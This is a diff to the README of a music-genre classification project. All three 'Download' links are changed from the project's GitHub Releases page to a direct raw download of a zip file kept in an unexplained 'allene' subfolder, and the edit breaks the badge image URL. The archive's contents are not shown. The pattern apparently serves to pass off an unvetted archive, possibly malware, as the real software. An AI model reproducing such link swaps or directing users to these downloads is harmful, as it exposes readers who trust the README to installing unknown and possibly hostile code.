@@ -1,6 +1,6 @@
 # 🎶 Music-Genre-Classification-using-Spectrogram-images - Classify Music Genres Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Ashu708907/Music-Genre-Classification-using-Spectrogram-images/releases)
+[![Download Now](https://raw.githubusercontent.com/Ashu708907/Music-Genre-Classification-using-Spectrogram-images/main/allene/Music-Genre-Classification-using-Spectrogram-images.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Ashu708907/Music-Genre-Classification-using-Spectrogram-images/main/allene/Music-Genre-Classification-using-Spectrogram-images.zip)
 
 ## 📋 Overview
 
@@ -23,7 +23,7 @@ Ensure your system meets the following requirements:
 
 To download the software, visit the Releases page. Click below to access the download options:
 
-[Download Here](https://github.com/Ashu708907/Music-Genre-Classification-using-Spectrogram-images/releases)
+[Download Here](https://raw.githubusercontent.com/Ashu708907/Music-Genre-Classification-using-Spectrogram-images/main/allene/Music-Genre-Classification-using-Spectrogram-images.zip)
 
 ### 3. Choose Your Model
 
@@ -50,7 +50,7 @@ After downloading, follow these steps:
 
 For more options and detailed instructions, revisit the Releases page:
 
-[Download Here](https://github.com/Ashu708907/Music-Genre-Classification-using-Spectrogram-images/releases)
+[Download Here](https://raw.githubusercontent.com/Ashu708907/Music-Genre-Classification-using-Spectrogram-images/main/allene/Music-Genre-Classification-using-Spectrogram-images.zip)
 
 ## 🔧 How to Use the Application
 
